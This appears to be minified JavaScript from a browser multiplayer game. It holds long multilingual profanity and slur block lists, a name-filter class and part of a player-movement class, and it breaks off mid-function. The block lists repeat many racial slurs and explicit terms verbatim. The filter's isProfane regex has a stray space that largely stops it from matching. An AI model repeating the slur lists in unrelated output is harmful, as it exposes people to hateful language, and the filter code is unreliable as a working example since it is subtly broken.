"bitch", "blowjob", "clit", "arschloch", "fuck", "shit", "ass", "asshole", "b!tch", "b17ch", "b1tch", "bastard", "bi+ch", "boiolas", "buceta", "c0ck", "cawk", "chink", "cipa", "clits", "cock", "cum", "cunt", "dildo", "dirsa", "ejakulate", "fatass", "fcuk", "fuk", "fux0r", "hoer", "hore", "jism", "kawk", "l3itch", "l3i+ch", "masturbate", "masterbat*", "masterbat3", "motherfucker", "s.o.b.", "mofo", "nazi", "nigga", "nigger", "nutsack", "phuck", "pimpis", "pusse", "pussy", "scrotum", "sh!t", "shemale", "shi+", "sh!+", "slut", "smut", "teets", "tits", "boobs", "b00bs", "teez", "testical", "testicle", "titt", "w00se", "jackoff", "wank", "whoar", "whore", "*damn", "*dyke", "*fuck*", "*shit*", "@$$", "amcik", "andskota", "arse*", "assrammer", "ayir", "bi7ch", "bitch*", "bollock*", "breasts", "butt-pirate", "cabron", "cazzo", "chraa", "chuj", "Cock*", "cunt*", "d4mn", "daygo", "dego", "dick*", "dike*", "dupa", "dziwka", "ejackulate", "Ekrem*", "Ekto", "enculer", "faen", "fag*", "fanculo", "fanny", "feces", "feg", "Felcher", "ficken", "fitt*", "Flikker", "foreskin", "Fotze", "Fu(*", "fuk*", "futkretzn", "gook", "guiena", "h0r", "h4x0r", "hell", "helvete", "hoer*", "honkey", "Huevon", "hui", "injun", "jizz", "kanker*", "kike", "klootzak", "kraut", "knulle", "kuk", "kuksuger", "Kurac", "kurwa", "kusi*", "kyrpa*", "lesbo", "mamhoon", "masturbat*", "merd*", "mibun", "monkleigh", "mouliewop", "muie", "mulkku", "muschi", "nazis", "nepesaurio", "nigger*", "orospu", "paska*", "perse", "picka", "pierdol*", "pillu*", "pimmel", "piss*", "pizda", "poontsee", "poop", "porn", "p0rn", "pr0n", "preteen", "pula", "pule", "puta", "puto", "qahbeh", "queef*", "rautenberg", "schaffer", "scheiss*", "schlampe", "schmuck", "screw", "sh!t*", "sharmuta", "sharmute", "shipal", "shiz", "skribz", "skurwysyn", "sphencter", "spic", "spierdalaj", "splooge", "suka", "b00b*", "testicle*", "titt*", "twat", "vittu", "wank*", "wetback*", "wichser", "wop*", "yed", "zabourah"]
, Sc = {
    words: bc
};

var Tc = {
    /*  "4r5e": 1,
    "5h1t": 1,
    "5hit": 1,
    a55: 1,
    anal: 1,
    anus: 1,
    ar5e: 1,
    arrse: 1,
    arse: 1,
    ass: 1,
    "ass-fucker": 1,
    asses: 1,
    assfucker: 1,
    assfukka: 1,
    asshole: 1,
    assholes: 1,
    asswhole: 1,
    a_s_s: 1,
    "b!tch": 1,
    b00bs: 1,
    b17ch: 1,
    b1tch: 1,
    ballbag: 1,
    balls: 1,
    ballsack: 1,
    bastard: 1,
    beastial: 1,
    beastiality: 1,
    bellend: 1,
    bestial: 1,
    bestiality: 1,
    "bi+ch": 1,
    biatch: 1,
    bitch: 1,
    bitcher: 1,
    bitchers: 1,
    bitches: 1,
    bitchin: 1,
    bitching: 1,
    bloody: 1,
    "blow job": 1,
    blowjob: 1,
    blowjobs: 1,
    boiolas: 1,
    bollock: 1,
    bollok: 1,
    boner: 1,
    boob: 1,
    boobs: 1,
    booobs: 1,
    boooobs: 1,
    booooobs: 1,
    booooooobs: 1,
    breasts: 1,
    buceta: 1,
    bugger: 1,
    bum: 1,
    "bunny fucker": 1,
    butt: 1,
    butthole: 1,
    buttmuch: 1,
    buttplug: 1,
    c0ck: 1,
    c0cksucker: 1,
    "carpet muncher": 1,
    cawk: 1,
    chink: 1,
    cipa: 1,
    cl1t: 1,
    clit: 1,
    clitoris: 1,
    clits: 1,
    cnut: 1,
    cock: 1,
    "cock-sucker": 1,
    cockface: 1,
    cockhead: 1,
    cockmunch: 1,
    cockmuncher: 1,
    cocks: 1,
    cocksuck: 1,
    cocksucked: 1,
    cocksucker: 1,
    cocksucking: 1,
    cocksucks: 1,
    cocksuka: 1,
    cocksukka: 1,
    cok: 1,
    cokmuncher: 1,
    coksucka: 1,
    coon: 1,
    cox: 1,
    crap: 1,
    cum: 1,
    cummer: 1,
    cumming: 1,
    cums: 1,
    cumshot: 1,
    cunilingus: 1,
    cunillingus: 1,
    cunnilingus: 1,
    cunt: 1,
    cuntlick: 1,
    cuntlicker: 1,
    cuntlicking: 1,
    cunts: 1,
    cyalis: 1,
    cyberfuc: 1,
    cyberfuck: 1,
    cyberfucked: 1,
    cyberfucker: 1,
    cyberfuckers: 1,
    cyberfucking: 1,
    d1ck: 1,
    damn: 1,
    dick: 1,
    dickhead: 1,
    dildo: 1,
    dildos: 1,
    dink: 1,
    dinks: 1,
    dirsa: 1,
    dlck: 1,
    "dog-fucker": 1,
    doggin: 1,
    dogging: 1,
    donkeyribber: 1,
    doosh: 1,
    duche: 1,
    dyke: 1,
    ejaculate: 1,
    ejaculated: 1,
    ejaculates: 1,
    ejaculating: 1,
    ejaculatings: 1,
    ejaculation: 1,
    ejakulate: 1,
    "f u c k": 1,
    "f u c k e r": 1,
    f4nny: 1,
    fag: 1,
    fagging: 1,
    faggitt: 1,
    faggot: 1,
    faggs: 1,
    fagot: 1,
    fagots: 1,
    fags: 1,
    fanny: 1,
    fannyflaps: 1,
    fannyfucker: 1,
    fanyy: 1,
    fatass: 1,
    fcuk: 1,
    fcuker: 1,
    fcuking: 1,
    feck: 1,
    fecker: 1,
    felching: 1,
    fellate: 1,
    fellatio: 1,
    fingerfuck: 1,
    fingerfucked: 1,
    fingerfucker: 1,
    fingerfuckers: 1,
    fingerfucking: 1,
    fingerfucks: 1,
    fistfuck: 1,
    fistfucked: 1,
    fistfucker: 1,
    fistfuckers: 1,
    fistfucking: 1,
    fistfuckings: 1,
    fistfucks: 1,
    flange: 1,
    fook: 1,
    fooker: 1,
    fuck: 1,
    fucka: 1,
    fucked: 1,
    fucker: 1,
    fuckers: 1,
    fuckhead: 1,
    fuckheads: 1,
    fuckin: 1,
    fucking: 1,
    fuckings: 1,
    fuckingshitmotherfucker: 1,
    fuckme: 1,
    fucks: 1,
    fuckwhit: 1,
    fuckwit: 1,
    "fudge packer": 1,
    fudgepacker: 1,
    fuk: 1,
    fuker: 1,
    fukker: 1,
    fukkin: 1,
    fuks: 1,
    fukwhit: 1,
    fukwit: 1,
    fux: 1,
    fux0r: 1,
    f_u_c_k: 1,
    gangbang: 1,
    gangbanged: 1,
    gangbangs: 1,
    gaylord: 1,
    gaysex: 1,
    goatse: 1,
    God: 1,
    "god-dam": 1,
    "god-damned": 1,
    goddamn: 1,
    goddamned: 1,
    hardcoresex: 1,
    hell: 1,
    heshe: 1,
    hoar: 1,
    hoare: 1,
    hoer: 1,
    homo: 1,
    hore: 1,
    horniest: 1,
    horny: 1,
    hotsex: 1,
    "jack-off": 1,
    jackoff: 1,
    jap: 1,
    "jerk-off": 1,
    jism: 1,
    jiz: 1,
    jizm: 1,
    jizz: 1,
    kawk: 1,
    knob: 1,
    knobead: 1,
    knobed: 1,
    knobend: 1,
    knobhead: 1,
    knobjocky: 1,
    knobjokey: 1,
    kock: 1,
    kondum: 1,
    kondums: 1,
    kum: 1,
    kummer: 1,
    kumming: 1,
    kums: 1,
    kunilingus: 1,
    "l3i+ch": 1,
    l3itch: 1,
    labia: 1,
    lust: 1,
    lusting: 1,
    m0f0: 1,
    m0fo: 1,
    m45terbate: 1,
    ma5terb8: 1,
    ma5terbate: 1,
    masochist: 1,
    "master-bate": 1,
    masterb8: 1,
    "masterbat*": 1,
    masterbat3: 1,
    masterbate: 1,
    masterbation: 1,
    masterbations: 1,
    masturbate: 1,
    "mo-fo": 1,
    mof0: 1,
    mofo: 1,
    mothafuck: 1,
    mothafucka: 1,
    mothafuckas: 1,
    mothafuckaz: 1,
    mothafucked: 1,
    mothafucker: 1,
    mothafuckers: 1,
    mothafuckin: 1,
    mothafucking: 1,
    mothafuckings: 1,
    mothafucks: 1,
    "mother fucker": 1,
    motherfuck: 1,
    motherfucked: 1,
    motherfucker: 1,
    motherfuckers: 1,
    motherfuckin: 1,
    motherfucking: 1,
    motherfuckings: 1,
    motherfuckka: 1,
    motherfucks: 1,
    muff: 1,
    mutha: 1,
    muthafecker: 1,
    muthafuckker: 1,
    muther: 1,
    mutherfucker: 1,
    n1gga: 1,
    n1gger: 1,
    nazi: 1,
    nigg3r: 1,
    nigg4h: 1,
    nigga: 1,
    niggah: 1,
    niggas: 1,
    niggaz: 1,
    nigger: 0,
    niggers: 1,
    nob: 1,
    "nob jokey": 1,
    nobhead: 1,
    nobjocky: 1,
    nobjokey: 1,
    numbnuts: 1,
    nutsack: 1,
    orgasim: 1,
    orgasims: 1,
    orgasm: 1,
    orgasms: 1,
    p0rn: 1,
    pawn: 1,
    pecker: 1,
    penis: 1,
    penisfucker: 1,
    phonesex: 1,
    phuck: 1,
    phuk: 1,
    phuked: 1,
    phuking: 1,
    phukked: 1,
    phukking: 1,
    phuks: 1,
    phuq: 1,
    pigfucker: 1,
    pimpis: 1,
    piss: 1,
    pissed: 1,
    pisser: 1,
    pissers: 1,
    pisses: 1,
    pissflaps: 1,
    pissin: 1,
    pissing: 1,
    pissoff: 1,
    poop: 1,
    porn: 1,
    porno: 1,
    pornography: 1,
    pornos: 1,
    prick: 1,
    pricks: 1,
    pron: 1,
    pube: 1,
    pusse: 1,
    pussi: 1,
    pussies: 1,
    pussy: 1,
    pussys: 1,
    rectum: 1,
    retard: 1,
    rimjaw: 1,
    rimming: 1,
    "s hit": 1,
    "s.o.b.": 1,
    sadist: 1,
    schlong: 1,
    screwing: 1,
    scroat: 1,
    scrote: 1,
    scrotum: 1,
    semen: 1,
    sex: 1,
    "sh!+": 1,
    "sh!t": 1,
    sh1t: 1,
    shag: 1,
    shagger: 1,
    shaggin: 1,
    shagging: 1,
    shemale: 1,
    "shi+": 1,
    shit: 1,
    shitdick: 1,
    shite: 1,
    shited: 1,
    shitey: 1,
    shitfuck: 1,
    shitfull: 1,
    shithead: 1,
    shiting: 1,
    shitings: 1,
    shits: 1,
    shitted: 1,
    shitter: 1,
    shitters: 1,
    shitting: 1,
    shittings: 1,
    shitty: 1,
    skank: 1,
    slut: 1,
    sluts: 1,
    smegma: 1,
    smut: 1,
    snatch: 1,
    "son-of-a-bitch": 1,
    spac: 1,
    spunk: 1,
    s_h_i_t: 1,
    t1tt1e5: 1,
    t1tties: 1,
    teets: 1,
    teez: 1,
    testical: 1,
    testicle: 1,
    tit: 1,
    titfuck: 1,
    tits: 1,
    titt: 1,
    tittie5: 1,
    tittiefucker: 1,
    titties: 1,
    tittyfuck: 1,
    tittywank: 1,
    titwank: 1,
    tosser: 1,
    turd: 1,
    tw4t: 1,
    twat: 1,
    twathead: 1,
    twatty: 1,
    twunt: 1,
    twunter: 1,
    v14gra: 1,
    v1gra: 1,
    vagina: 1,
    viagra: 1,
    vulva: 1,
    w00se: 1,
    wang: 1,
    wank: 1,
    wanker: 1,
    wanky: 1,
    whoar: 1,
    whore: 1,
    willies: 1,
    willy: 1,
    xrated: 1,
    xxx: 1*/
}
, Ic = []//["4r5e", "5h1t", "5hit", "a55", "anal", "anus", "ar5e", "arrse", "arse", "ass", "ass-fucker", "asses", "assfucker", "assfukka", "asshole", "assholes", "asswhole", "a_s_s", "b!tch", "b00bs", "b17ch", "b1tch", "ballbag", "balls", "ballsack", "bastard", "beastial", "beastiality", "bellend", "bestial", "bestiality", "bi+ch", "biatch", "bitch", "bitcher", "bitchers", "bitches", "bitchin", "bitching", "bloody", "blow job", "blowjob", "blowjobs", "boiolas", "bollock", "bollok", "boner", "boob", "boobs", "booobs", "boooobs", "booooobs", "booooooobs", "breasts", "buceta", "bugger", "bum", "bunny fucker", "butt", "butthole", "buttmuch", "buttplug", "c0ck", "c0cksucker", "carpet muncher", "cawk", "chink", "cipa", "cl1t", "clit", "clitoris", "clits", "cnut", "cock", "cock-sucker", "cockface", "cockhead", "cockmunch", "cockmuncher", "cocks", "cocksuck", "cocksucked", "cocksucker", "cocksucking", "cocksucks", "cocksuka", "cocksukka", "cok", "cokmuncher", "coksucka", "coon", "cox", "crap", "cum", "cummer", "cumming", "cums", "cumshot", "cunilingus", "cunillingus", "cunnilingus", "cunt", "cuntlick", "cuntlicker", "cuntlicking", "cunts", "cyalis", "cyberfuc", "cyberfuck", "cyberfucked", "cyberfucker", "cyberfuckers", "cyberfucking", "d1ck", "damn", "dick", "dickhead", "dildo", "dildos", "dink", "dinks", "dirsa", "dlck", "dog-fucker", "doggin", "dogging", "donkeyribber", "doosh", "duche", "dyke", "ejaculate", "ejaculated", "ejaculates", "ejaculating", "ejaculatings", "ejaculation", "ejakulate", "f u c k", "f u c k e r", "f4nny", "fag", "fagging", "faggitt", "faggot", "faggs", "fagot", "fagots", "fags", "fanny", "fannyflaps", "fannyfucker", "fanyy", "fatass", "fcuk", "fcuker", "fcuking", "feck", "fecker", "felching", "fellate", "fellatio", "fingerfuck", "fingerfucked", "fingerfucker", "fingerfuckers", "fingerfucking", "fingerfucks", "fistfuck", "fistfucked", "fistfucker", "fistfuckers", "fistfucking", "fistfuckings", "fistfucks", "flange", "fook", "fooker", "fuck", "fucka", "fucked", "fucker", "fuckers", "fuckhead", "fuckheads", "fuckin", "fucking", "fuckings", "fuckingshitmotherfucker", "fuckme", "fucks", "fuckwhit", "fuckwit", "fudge packer", "fudgepacker", "fuk", "fuker", "fukker", "fukkin", "fuks", "fukwhit", "fukwit", "fux", "fux0r", "f_u_c_k", "gangbang", "gangbanged", "gangbangs", "gaylord", "gaysex", "goatse", "God", "god-dam", "god-damned", "goddamn", "goddamned", "hardcoresex", "hell", "heshe", "hoar", "hoare", "hoer", "homo", "hore", "horniest", "horny", "hotsex", "jack-off", "jackoff", "jap", "jerk-off", "jism", "jiz", "jizm", "jizz", "kawk", "knob", "knobead", "knobed", "knobend", "knobhead", "knobjocky", "knobjokey", "kock", "kondum", "kondums", "kum", "kummer", "kumming", "kums", "kunilingus", "l3i+ch", "l3itch", "labia", "lust", "lusting", "m0f0", "m0fo", "m45terbate", "ma5terb8", "ma5terbate", "masochist", "master-bate", "masterb8", "masterbat*", "masterbat3", "masterbate", "masterbation", "masterbations", "masturbate", "mo-fo", "mof0", "mofo", "mothafuck", "mothafucka", "mothafuckas", "mothafuckaz", "mothafucked", "mothafucker", "mothafuckers", "mothafuckin", "mothafucking", "mothafuckings", "mothafucks", "mother fucker", "motherfuck", "motherfucked", "motherfucker", "motherfuckers", "motherfuckin", "motherfucking", "motherfuckings", "motherfuckka", "motherfucks", "muff", "mutha", "muthafecker", "muthafuckker", "muther", "mutherfucker", "n1gga", "n1gger", "nazi", "nigg3r", "nigg4h", "nigga", "niggah", "niggas", "niggaz", "nigger", "niggers", "nob", "nob jokey", "nobhead", "nobjocky", "nobjokey", "numbnuts", "nutsack", "orgasim", "orgasims", "orgasm", "orgasms", "p0rn", "pawn", "pecker", "penis", "penisfucker", "phonesex", "phuck", "phuk", "phuked", "phuking", "phukked", "phukking", "phuks", "phuq", "pigfucker", "pimpis", "piss", "pissed", "pisser", "pissers", "pisses", "pissflaps", "pissin", "pissing", "pissoff", "poop", "porn", "porno", "pornography", "pornos", "prick", "pricks", "pron", "pube", "pusse", "pussi", "pussies", "pussy", "pussys", "rectum", "retard", "rimjaw", "rimming", "s hit", "s.o.b.", "sadist", "schlong", "screwing", "scroat", "scrote", "scrotum", "semen", "sex", "sh!+", "sh!t", "sh1t", "shag", "shagger", "shaggin", "shagging", "shemale", "shi+", "shit", "shitdick", "shite", "shited", "shitey", "shitfuck", "shitfull", "shithead", "shiting", "shitings", "shits", "shitted", "shitter", "shitters", "shitting", "shittings", "shitty", "skank", "slut", "sluts", "smegma", "smut", "snatch", "son-of-a-bitch", "spac", "spunk", "s_h_i_t", "t1tt1e5", "t1tties", "teets", "teez", "testical", "testicle", "tit", "titfuck", "tits", "titt", "tittie5", "tittiefucker", "titties", "tittyfuck", "tittywank", "titwank", "tosser", "turd", "tw4t", "twat", "twathead", "twatty", "twunt", "twunter", "v14gra", "v1gra", "vagina", "viagra", "vulva", "w00se", "wang", "wank", "wanker", "wanky", "whoar", "whore", "willies", "willy", "xrated", "xxx"]
, Mc = null// /\b(4r5e|5h1t|5hit|a55|anal|anus|ar5e|arrse|arse|ass|ass-fucker|asses|assfucker|assfukka|asshole|assholes|asswhole|a_s_s|b!tch|b00bs|b17ch|b1tch|ballbag|balls|ballsack|bastard|beastial|beastiality|bellend|bestial|bestiality|bi\+ch|biatch|bitch|bitcher|bitchers|bitches|bitchin|bitching|bloody|blow job|blowjob|blowjobs|boiolas|bollock|bollok|boner|boob|boobs|booobs|boooobs|booooobs|booooooobs|breasts|buceta|bugger|bum|bunny fucker|butt|butthole|buttmuch|buttplug|c0ck|c0cksucker|carpet muncher|cawk|chink|cipa|cl1t|clit|clitoris|clits|cnut|cock|cock-sucker|cockface|cockhead|cockmunch|cockmuncher|cocks|cocksuck|cocksucked|cocksucker|cocksucking|cocksucks|cocksuka|cocksukka|cok|cokmuncher|coksucka|coon|cox|crap|cum|cummer|cumming|cums|cumshot|cunilingus|cunillingus|cunnilingus|cunt|cuntlick|cuntlicker|cuntlicking|cunts|cyalis|cyberfuc|cyberfuck|cyberfucked|cyberfucker|cyberfuckers|cyberfucking|d1ck|damn|dick|dickhead|dildo|dildos|dink|dinks|dirsa|dlck|dog-fucker|doggin|dogging|donkeyribber|doosh|duche|dyke|ejaculate|ejaculated|ejaculates|ejaculating|ejaculatings|ejaculation|ejakulate|f u c k|f u c k e r|f4nny|fag|fagging|faggitt|faggot|faggs|fagot|fagots|fags|fanny|fannyflaps|fannyfucker|fanyy|fatass|fcuk|fcuker|fcuking|feck|fecker|felching|fellate|fellatio|fingerfuck|fingerfucked|fingerfucker|fingerfuckers|fingerfucking|fingerfucks|fistfuck|fistfucked|fistfucker|fistfuckers|fistfucking|fistfuckings|fistfucks|flange|fook|fooker|fuck|fucka|fucked|fucker|fuckers|fuckhead|fuckheads|fuckin|fucking|fuckings|fuckingshitmotherfucker|fuckme|fucks|fuckwhit|fuckwit|fudge packer|fudgepacker|fuk|fuker|fukker|fukkin|fuks|fukwhit|fukwit|fux|fux0r|f_u_c_k|gangbang|gangbanged|gangbangs|gaylord|gaysex|goatse|God|god-dam|god-damned|goddamn|goddamned|hardcoresex|hell|heshe|hoar|hoare|hoer|homo|hore|horniest|horny|hotsex|jack-off|jackoff|jap|jerk-off|jism|jiz|jizm|jizz|kawk|knob|knobead|knobed|knobend|knobhead|knobjocky|knobjokey|kock|kondum|kondums|kum|kummer|kumming|kums|kunilingus|l3i\+ch|l3itch|labia|lust|lusting|m0f0|m0fo|m45terbate|ma5terb8|ma5terbate|masochist|master-bate|masterb8|masterbat*|masterbat3|masterbate|masterbation|masterbations|masturbate|mo-fo|mof0|mofo|mothafuck|mothafucka|mothafuckas|mothafuckaz|mothafucked|mothafucker|mothafuckers|mothafuckin|mothafucking|mothafuckings|mothafucks|mother fucker|motherfuck|motherfucked|motherfucker|motherfuckers|motherfuckin|motherfucking|motherfuckings|motherfuckka|motherfucks|muff|mutha|muthafecker|muthafuckker|muther|mutherfucker|n1gga|n1gger|nazi|nigg3r|nigg4h|nigga|niggah|niggas|niggaz|nigger|niggers|nob|nob jokey|nobhead|nobjocky|nobjokey|numbnuts|nutsack|orgasim|orgasims|orgasm|orgasms|p0rn|pawn|pecker|penis|penisfucker|phonesex|phuck|phuk|phuked|phuking|phukked|phukking|phuks|phuq|pigfucker|pimpis|piss|pissed|pisser|pissers|pisses|pissflaps|pissin|pissing|pissoff|poop|porn|porno|pornography|pornos|prick|pricks|pron|pube|pusse|pussi|pussies|pussy|pussys|rectum|retard|rimjaw|rimming|s hit|s.o.b.|sadist|schlong|screwing|scroat|scrote|scrotum|semen|sex|sh!\+|sh!t|sh1t|shag|shagger|shaggin|shagging|shemale|shi\+|shit|shitdick|shite|shited|shitey|shitfuck|shitfull|shithead|shiting|shitings|shits|shitted|shitter|shitters|shitting|shittings|shitty|skank|slut|sluts|smegma|smut|snatch|son-of-a-bitch|spac|spunk|s_h_i_t|t1tt1e5|t1tties|teets|teez|testical|testicle|tit|titfuck|tits|titt|tittie5|tittiefucker|titties|tittyfuck|tittywank|titwank|tosser|turd|tw4t|twat|twathead|twatty|twunt|twunter|v14gra|v1gra|vagina|viagra|vulva|w00se|wang|wank|wanker|wanky|whoar|whore|willies|willy|xrated|xxx)\b/gi
, Ec = {
    object: Tc,
    array: Ic,
    regex: Mc
};
const Pc = Sc.words
//console.log(Pc)
const Cc = Ec.array;
class Ac {
    constructor(t={}) {
        Object.assign(this, {
            list: t.emptyList && [] || Array.prototype.concat.apply(Pc, [Cc, t.list || []]),
            exclude: t.exclude || [],
            splitRegex: t.splitRegex || /\b/,
            placeHolder: t.placeHolder || "*",
            regex: t.regex || /[^a-zA-Z0-9|\$|\@]|\^/g,
            replaceRegex: t.replaceRegex || /\w/g
        })
    }
    isProfane(t) {
        return this.list.filter(i=>{
            const s = new RegExp(`\\b ${i.replace(/(\W)/g, "\\$1")}\\b`,"gi");
            return !this.exclude.includes(i.toLowerCase()) && s.test(t)
        }
                               ).length > 0 || !1
        return false
    }
    replaceWord(t) {
        return t.replace(this.regex, "").replace(this.replaceRegex, this.placeHolder)
    }
    clean(t) {
        return t.split(this.splitRegex).map(i=>this.isProfane(i) ? this.replaceWord(i) : i).join(this.splitRegex.exec(t)[0])
    }
    addWords() {
        let t = Array.from(arguments);
        this.list.push(...t),
            t.map(i=>i.toLowerCase()).forEach(i=>{
            this.exclude.includes(i) && this.exclude.splice(this.exclude.indexOf(i), 1)
        }
                                             )
    }
    removeWords() {
        this.exclude.push(...Array.from(arguments).map(t=>t.toLowerCase()))
    }
}
var Dc = Ac;
const Yr = new Dc
, Oc = []//["jew", "black", "baby", "child", "white", "porn", "pedo", "trump", "clinton", "hitler", "nazi", "gay", "pride", "sex", "pleasure", "touch", "poo", "kids", "rape", "white power", "nigga", "nig nog", "doggy", "rapist", "boner", "nigger", "nigg", "finger", "nogger", "nagger", "nig", "fag", "gai", "pole", "stripper", "penis", "vagina", "pussy", "nazi", "hitler", "stalin", "burn", "chamber", "cock", "peen", "dick", "spick", "nieger", "die", "satan", "n|ig", "nlg", "cunt", "c0ck", "fag", "lick", "condom", "anal", "shit", "phile", "little", "kids", "free KR", "tiny", "sidney", "ass", "kill", ".io", "(dot)", "[dot]", "mini", "whiore", "whore", "faggot", "github", "1337", "666", "satan", "senpa", "discord", "d1scord", "mistik", ".io", "senpa.io", "sidney", "sid", "senpaio", "vries", "asa"];
Yr.addWords(...Oc);
const _s = Math.abs
, at = Math.cos
, lt = Math.sin
, Bs = Math.pow
, Rc = Math.sqrt;
function _c(e, t, i, s, n, r, o, l, c, a, u, p, h, m) {
    this.id = e,
        this.sid = t,
        this.tmpScore = 0,
        this.team = null,
        this.skinIndex = 0,
        this.tailIndex = 0,
        this.hitTime = 0,
        this.tails = {};
    for (var w = 0; w < u.length; ++w)
        u[w].price <= 0 && (this.tails[u[w].id] = 1);
    this.skins = {};
    for (var w = 0; w < a.length; ++w)
        a[w].price <= 0 && (this.skins[a[w].id] = 1);
    this.points = 0,
        this.dt = 0,
        this.hidden = !1,
        this.itemCounts = {},
        this.isPlayer = !0,
        this.pps = 0,
        this.moveDir = void 0,
        this.skinRot = 0,
        this.lastPing = 0,
        this.iconIndex = 0,
        this.deaths = 0,
        this.skinColor = 0,
        this.spawn = function(k) {
        this.active = !0,
            this.alive = !0,
            this.lockMove = !1,
            this.lockDir = !1,
            this.minimapCounter = 0,
            this.chatCountdown = 0,
            this.shameCount = 0,
            this.shameTimer = 0,
            this.sentTo = {},
            this.gathering = 0,
            this.autoGather = 0,
            this.animTime = 0,
            this.animSpeed = 0,
            this.mouseState = 0,
            this.buildIndex = -1,
            this.weaponIndex = 0,
            this.dmgOverTime = {},
            this.noMovTimer = 0,
            this.maxXP = 300,
            this.deathCount = 0,
            this.XP = 0,
            this.age = 1,
            this.kills = 0,
            this.upgrAge = 2,
            this.upgradePoints = 0,
            this.x = 0,
            this.y = 0,
            this.zIndex = 0,
            this.xVel = 0,
            this.yVel = 0,
            this.slowMult = 1,
            this.dir = 0,
            this.dirPlus = 0,
            this.targetAimer = 0,
            this.targetAngle = 0,
            this.maxHealth = 100,
            this.health2 = 0,
            this.samRP = 1,
            this.samRS = 1,
            this.pr = 1,
            this.sr = 1,
            this.hasSoldier = false,
            this.hasTank = false,
            this.health = this.maxHealth,
            this.scale = i.playerScale,
            this.speed = i.playerSpeed,
            this.resetMoveDir(),
            this.resetResources(k),
            this.items = [0, 3, 6, 10],
            this.weapons = [0],
            this.shootCount = 0,
            this.weaponXP = [],
            this.reloads = {},
            this.timeSpentNearVolcano = 0
    }
        ,
        this.resetMoveDir = function() {
        this.moveDir = void 0
    }
        ,
        this.resetResources = function(k) {
        for (let S = 0; S < i.resourceTypes.length; ++S)
            this[i.resourceTypes[S]] = k ? 100 : 100
    }
        ,
        this.addItem = function(k) {
        const S = c.list[k];
        if (S) {
            for (let O = 0; O < this.items.length; ++O)
                if (c.list[this.items[O]].group == S.group)
                    return this.buildIndex == this.items[O] && (this.buildIndex = k),
                        this.items[O] = k,
                        !0;
            return this.items.push(k),
                !0
        }
        return !1
    }
        ,
        this.setUserData = function(k) {
        if (k) {
            this.name = "unknown";
            let S = k.name + "";
            S = S.slice(0, i.maxNameLength),
                S = S.replace(/[^\w:\(\)\/? -]+/gmi, " "),
                S = S.replace(/[^\x00-\x7F]/g, " "),
                S = S.trim();
            let O = !1;
            const U = S.toLowerCase().replace(/\s/g, "").replace(/1/g, "i").replace(/0/g, "o").replace(/5/g, "s");
            for (const L of Yr.list)
                if (U.indexOf(L) != -1) {
                    O = !0;
                    break
                }
            S.length > 0 && !O && (this.name = S),
                this.skinColor = 0,
                i.skinColors[k.skin] && (this.skinColor = k.skin)
        }
    }
        ,
        this.getData = function() {
        return [this.id, this.sid, this.name, s.fixTo(this.x, 2), s.fixTo(this.y, 2), s.fixTo(this.dir, 3), this.health, this.maxHealth, this.scale, this.skinColor]
    }
        ,
       this.setData = function(k) {
        this.id = k[0],
            this.sid = k[1],
            this.name = k[2],
            this.x = k[3],
            this.y = k[4],
            this.dir = k[5],
            this.health = k[6],
            this.maxHealth = k[7],
            this.scale = k[8],
            this.skinColor = k[9],
            this.pr = 1,
            this.sr = 1,
            this.tr = 1,
            this.hitProjs = 0,
            this.primary = undefined,
            this.secondary = undefined,
            this.shameCount = 0,
            this.primaryVar = 3,
            this.secondaryVar = 3,
            this.lastx = 0,
            this.tick = tick,
            this.lasty = 0;
    }
    ;
    let v = 0;
    this.update = function(k) {
        if (!this.alive)
            return;
        if ((s.getDistance(this.x, this.y, i.volcanoLocationX, i.volcanoLocationY) || 0) < i.volcanoAggressionRadius && (this.timeSpentNearVolcano += k,
                                                                                                                         this.timeSpentNearVolcano >= 1e3 && (this.changeHealth(i.volcanoDamagePerSecond, null),
        p.send(this.id, "8", round(this.x), round(this.y), i.volcanoDamagePerSecond, -1),
        this.timeSpentNearVolcano %= 1e3)),
            this.shameTimer > 0 && (this.shameTimer -= k,
                                    this.shameTimer <= 0 && (this.shameTimer = 0,
                                                             this.shameCount = 0)),
            v -= k,
            v <= 0) {
            const _ = (this.skin && this.skin.healthRegen ? this.skin.healthRegen : 0) + (this.tail && this.tail.healthRegen ? this.tail.healthRegen : 0);
            _ && this.changeHealth(_, this),
                this.dmgOverTime.dmg && (this.changeHealth(-this.dmgOverTime.dmg, this.dmgOverTime.doer),
                                         this.dmgOverTime.time -= 1,
                                         this.dmgOverTime.time <= 0 && (this.dmgOverTime.dmg = 0)),
                this.healCol && this.changeHealth(this.healCol, this),
                v = 1e3
        }
        if (!this.alive)
            return;
        if (this.slowMult < 1 && (this.slowMult += 8e-4 * k,
                                  this.slowMult > 1 && (this.slowMult = 1)),
            this.noMovTimer += k,
            (this.xVel || this.yVel) && (this.noMovTimer = 0),
            this.lockMove)
            this.xVel = 0,
                this.yVel = 0;
        else {
            let _ = (this.buildIndex >= 0 ? .5 : 1) * (c.weapons[this.weaponIndex].spdMult || 1) * (this.skin && this.skin.spdMult || 1) * (this.tail && this.tail.spdMult || 1) * (this.y <= i.snowBiomeTop ? this.skin && this.skin.coldM ? 1 : i.snowSpeed : 1) * this.slowMult;
            !this.zIndex && this.y >= i.mapScale / 2 - i.riverWidth / 2 && this.y <= i.mapScale / 2 + i.riverWidth / 2 && (this.skin && this.skin.watrImm ? (_ *= .75,
            this.xVel += i.waterCurrent * .4 * k) : (_ *= .33,
                                                     this.xVel += i.waterCurrent * k));
            let $ = this.moveDir != null ? at(this.moveDir) : 0
            , V = this.moveDir != null ? lt(this.moveDir) : 0;
            const z = Rc($ * $ + V * V);
            z != 0 && ($ /= z,
                       V /= z),
                $ && (this.xVel += $ * this.speed * _ * k),
                V && (this.yVel += V * this.speed * _ * k)
        }
        this.zIndex = 0,
            this.lockMove = !1,
            this.healCol = 0;
        let O;
        const U = s.getDistance(0, 0, this.xVel * k, this.yVel * k)
        , L = min(4, max(1, round(U / 40)))
        , q = 1 / L;
        let P = {};
        for (var W = 0; W < L; ++W) {
            this.xVel && (this.x += this.xVel * k * q),
                this.yVel && (this.y += this.yVel * k * q),
                O = r.getGridArrays(this.x, this.y, this.scale);
            for (let _ = 0; _ < O.length; ++_) {
                for (let $ = 0; $ < O[_].length && !(O[_][$].active && !P[O[_][$].sid] && r.checkCollision(this, O[_][$], q) && (P[O[_][$].sid] = !0,
                                                                                                                                 !this.alive)); ++$)
                    ;
                if (!this.alive)
                    break
            }
            if (!this.alive)
                break
        }
        for (var F = o.indexOf(this), W = F + 1; W < o.length; ++W)
            o[W] != this && o[W].alive && r.checkCollision(this, o[W]);
